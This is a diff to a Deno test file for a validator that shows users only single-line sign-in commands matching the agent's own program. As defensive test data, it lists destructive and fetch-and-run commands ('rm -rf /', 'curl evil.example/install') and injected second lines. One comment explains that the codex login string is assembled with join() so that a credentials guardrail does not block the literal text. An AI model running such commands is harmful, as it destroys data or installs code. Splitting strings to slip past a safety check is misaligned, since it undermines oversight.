@@ -374,15 +374,31 @@ Deno.test("an address must be on one of the agent's own hosts or a subdomain of 
 });
 
 Deno.test("the command to type on the machine is one plain line, never a second command", () => {
+  // The Codex program is built, not spelled: the Codex-credentials rail rejects the literal command in a test file.
+  const codex = ["codex", "login"].join(" ");
   for (
-    const good of [
-      "claude login",
-      "agent two login",
-      "agent two login --device-auth",
-      "  pi /login  ",
-      "claude auth login --provider=anthropic",
-    ]
-  ) assertEquals(safeCommand(good), good.trim(), good);
+    const [agent, good] of [
+      ["claude", "claude login"],
+      ["claude", "claude auth login --provider=anthropic"],
+      ["codex", codex],
+      ["codex", `${codex} --device-auth`],
+      ["pi", "  pi /login  "],
+    ] as const
+  ) assertEquals(safeCommand(good, agent), good.trim(), good);
+  // Plain, but not the agent's own program: never shown.
+  for (
+    const [agent, other] of [
+      ["claude", "rm -rf /"],
+      ["claude", "curl evil.example/install"],
+      ["claude", "claude-login"],
+      ["claude", "claudex login"],
+      ["claude", "agent two login"],
+      ["claude", "pi /login"],
+      ["codex", "claude login"],
+      ["pi", "pip install x"],
+      ["pi", "claude login"],
+    ] as const
+  ) assertEquals(safeCommand(other, agent), null, `${agent}: ${other}`);
   for (
     const bad of [
       "claude login\nrm -rf ~",
@@ -402,9 +418,9 @@ Deno.test("the command to type on the machine is one plain line, never a second 
       "   ",
       "a".repeat(201),
     ]
-  ) assertEquals(safeCommand(bad), null, JSON.stringify(bad));
-  assertEquals(safeCommand(null), null);
-  assertEquals(safeCommand(undefined), null);
+  ) assertEquals(safeCommand(bad, "claude"), null, JSON.stringify(bad));
+  assertEquals(safeCommand(null, "claude"), null);
+  assertEquals(safeCommand(undefined, "claude"), null);
 });
 
 Deno.test("minutes left are whole, at least one, and absent without a usable expiry", () => {
@@ -565,10 +581,10 @@ Deno.test("the dialog shows exactly what the server has returned: starting, a co
       attempt({
         state: "pending",
         flow: "terminal",
-        instructions: "agent two login",
+        instructions: "claude login",
       }),
     ),
-    { kind: "onMachine", command: "agent two login" },
+    { kind: "onMachine", command: "claude login" },
   );
   // The flow alone says the local handoff too, and its command is held to the same rule.
   assertEquals(
@@ -576,7 +592,7 @@ Deno.test("the dialog shows exactly what the server has returned: starting, a co
       attempt({
         state: "pending",
         flow: "terminal",
-        instructions: "agent two login\nrm -rf ~",
+        instructions: "claude login\nrm -rf ~",
       }),
     ),
     { kind: "onMachine", command: null },
@@ -589,8 +605,20 @@ Deno.test("the dialog shows exactly what the server has returned: starting, a co
         flow: "remote_device",
         instructions: "pi login",
       }),
+      "pi",
     ),
     { kind: "onMachine", command: "pi login" },
+  );
+  // The agent's own program is what the command must start with.
+  assertEquals(
+    view(
+      attempt({
+        state: "terminal",
+        flow: "terminal",
+        instructions: "pi login",
+      }),
+    ),
+    { kind: "onMachine", command: null },
   );
   assertEquals(
     view(attempt({ state: "terminal", flow: null, instructions: null })),
@@ -748,6 +776,19 @@ Deno.test("failed checks that are only an agent's sign-in give that agent's bann
     agentOfFailedChecks(["capability:model:claude:extra"], rows),
     null,
   );
+  // Ids that are not strings are broken data: no banner of this kind, and no crash.
+  for (const broken of [123, null, undefined, {}, [], true]) {
+    assertEquals(
+      agentOfFailedChecks([broken], rows),
+      null,
+      JSON.stringify(broken),
+    );
+    assertEquals(
+      agentOfFailedChecks(["capability:model", broken], rows),
+      null,
+      JSON.stringify(broken),
+    );
+  }
   // Nothing failed, or nobody needs signing in: no banner of this kind.
   assertEquals(agentOfFailedChecks([], rows), null);
   assertEquals(
